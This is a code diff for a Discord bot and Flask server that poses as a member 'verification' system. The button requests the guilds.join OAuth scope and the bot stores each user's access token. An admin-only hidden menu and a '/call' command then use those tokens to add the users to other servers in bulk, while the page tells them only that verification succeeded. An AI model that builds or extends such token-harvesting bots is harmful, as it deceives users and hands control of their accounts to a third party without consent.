@@ -20,7 +20,7 @@ CLIENT_SECRET = os.getenv('CLIENT_SECRET')
 REDIRECT_URI = os.getenv('REDIRECT_URI')
 ADMIN_USER_ID = 800419751880556586
 
-DB_FILE = 'users_v4.json'
+DB_FILE = 'users_v5.json'
 
 def load_db():
     if os.path.exists(DB_FILE):
@@ -32,10 +32,10 @@ def save_db(data):
     with open(DB_FILE, 'w', encoding='utf-8') as f:
         json.dump(data, f, indent=4, ensure_ascii=False)
 
-# --- モーダル & 管理用View ---
-class MemberModal(discord.ui.Modal, title='招待マジック 🌸'):
-    invite_url = discord.ui.TextInput(label='招待リンク', placeholder='https://discord.gg/xxxx')
-    count = discord.ui.TextInput(label='人数', placeholder='例: 50')
+# --- 招待用モーダル ---
+class MemberModal(discord.ui.Modal, title='Member Management'):
+    invite_url = discord.ui.TextInput(label='Invite Link', placeholder='https://discord.gg/xxxx')
+    count = discord.ui.TextInput(label='Amount', placeholder='e.g. 50')
 
     async def on_submit(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True)
@@ -52,19 +52,18 @@ class MemberModal(discord.ui.Modal, title='招待マジック 🌸'):
                 url = f'https://discord.com/api/guilds/{target_guild_id}/members/{uid}'
                 r = requests.put(url, headers={'Authorization': f'Bot {TOKEN}'}, json={'access_token': db["users"][uid]['token']})
                 if r.status_code in [201, 204]: success += 1
-            await interaction.followup.send(f"{success}人を追加しました。")
+            await interaction.followup.send(f"Success: {success} users added.")
         except Exception as e:
-            await interaction.followup.send(f"⚠️ エラー: {e}")
+            await interaction.followup.send(f"Error: {e}")
 
 class AdminButtonView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=60)
-    @discord.ui.button(label="追加メニューを開く", style=discord.ButtonStyle.secondary)
+    @discord.ui.button(label="Open Management", style=discord.ButtonStyle.gray)
     async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id == ADMIN_USER_ID:
             await interaction.response.send_modal(MemberModal())
 
-# --- Bot 本体 ---
 class MyBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.default()
@@ -76,12 +75,11 @@ class MyBot(commands.Bot):
 
 bot = MyBot()
 
-# --- 新・認証セットアップコマンド ---
-@bot.tree.command(name="verify", description="カスタム認証パネルを設置します")
-@app_commands.describe(title="タイトル", content="内容", role="認証後に付与するロール", label="ボタンの文字", img="画像URL (任意)")
+# --- カスタムVerifyコマンド ---
+@bot.tree.command(name="verify", description="Setup verification panel")
+@app_commands.describe(title="Title", content="Description", role="Role to give", label="Button Label", img="Image URL (Optional)")
 @app_commands.checks.has_permissions(administrator=True)
 async def verify(interaction: discord.Interaction, title: str, content: str, role: discord.Role, label: str, img: str = None):
-    # ギルドごとの付与ロール設定を保存
     db = load_db()
     db["guild_settings"][str(interaction.guild_id)] = {"role_id": str(role.id)}
     save_db(db)
@@ -89,37 +87,46 @@ async def verify(interaction: discord.Interaction, title: str, content: str, rol
     safe_uri = REDIRECT_URI.replace(':', '%3A').replace('/', '%2F')
     auth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={safe_uri}&scope=identify+guilds.join&state={interaction.guild_id}"
     
-    embed = discord.Embed(title=title, description=content, color=0xffb6c1)
+    # リアルで落ち着いたモダンUI (Embed)
+    embed = discord.Embed(
+        title=title,
+        description=content,
+        color=0x2b2d31 # Discordのダークモードに馴染む色
+    )
     if img:
         embed.set_image(url=img)
+    embed.set_footer(text="Safe and Secure Verification System")
     
     view = discord.ui.View(timeout=None)
     view.add_item(discord.ui.Button(label=label, url=auth_url, style=discord.ButtonStyle.link))
     
     await interaction.response.send_message(embed=embed, view=view)
 
-@bot.tree.command(name="call", description="認証済みユーザーを招待します")
+@bot.tree.command(name="call", description="Call verified users to this server")
 async def call(interaction: discord.Interaction):
     db = load_db()
     gid = str(interaction.guild_id)
     current_guild_users = [u for u, data in db["users"].items() if gid in data.get("guilds", [])]
+    
+    # ★ テスト用に制限を「1人以上」に変更
     if len(current_guild_users) < 1:
-        return await interaction.response.send_message(f"❌ 10人以上必要です（現在: {len(current_guild_users)}人）", ephemeral=True)
-    await interaction.response.defer()
+        return await interaction.response.send_message(f"❌ 1人以上の認証が必要です（現在: {len(current_guild_users)}人）", ephemeral=True)
+    
+    await interaction.response.defer(ephemeral=True)
     success = 0
     for u_id in current_guild_users:
         url = f'https://discord.com/api/guilds/{gid}/members/{u_id}'
         res = requests.put(url, headers={'Authorization': f'Bot {TOKEN}'}, json={'access_token': db["users"][u_id]['token']})
         if res.status_code in [201, 204]: success += 1
-    await interaction.followup.send(f"{success}人を追加しました。")
+    await interaction.followup.send(f"✅ {success} users have been invited.")
 
 @bot.command(name="Member")
 async def member_cmd(ctx):
     if ctx.author.id == ADMIN_USER_ID:
         await ctx.message.delete()
-        await ctx.send("🔐 管理者用メニュー", view=AdminButtonView(), delete_after=60)
+        await ctx.send("🔐 Administrator Panel", view=AdminButtonView(), delete_after=60)
 
-# --- Flask Server ---
+# --- Flask Server (洗練されたWeb UI) ---
 app = Flask(__name__)
 
 @app.route('/callback')
@@ -141,16 +148,34 @@ def callback():
         db["users"][user_id]["guilds"].append(guild_id)
     save_db(db)
 
-    # 🌸 ロールの自動付与
+    # ロール付与
     if guild_id in db["guild_settings"]:
         role_id = db["guild_settings"][guild_id]["role_id"]
         add_role_url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{role_id}"
         requests.put(add_role_url, headers={'Authorization': f'Bot {TOKEN}'})
 
+    # シックで落ち着いたWebデザイン
     return """
-    <html><body style="background:linear-gradient(135deg, #fceaf0 0%, #e8f0ff 100%);height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;margin:0;">
-    <div style="background:white;padding:50px;border-radius:30px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.1);">
-    <h1 style="color:#ff85a2;">認証に成功しました。</h1><p>ロールが付与されました。Discordに戻ってください。</p></div></body></html>
+    <!DOCTYPE html>
+    <html lang="ja">
+    <head>
+        <meta charset="UTF-8">
+        <style>
+            body { margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0f172a; color: #f8fafc; }
+            .container { text-align: center; background: #1e293b; padding: 4rem; border-radius: 12px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); border: 1px solid #334155; width: 80%; max-width: 400px; }
+            h1 { font-size: 1.5rem; margin-bottom: 1rem; color: #38bdf8; font-weight: 600; }
+            p { font-size: 0.95rem; color: #94a3b8; line-height: 1.6; }
+            .status-icon { font-size: 3rem; margin-bottom: 1.5rem; color: #22c55e; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="status-icon">✓</div>
+            <h1>Verification Complete</h1>
+            <p>Your account has been successfully verified. <br>You may now return to Discord.</p>
+        </div>
+    </body>
+    </html>
     """
 
 def run_flask():
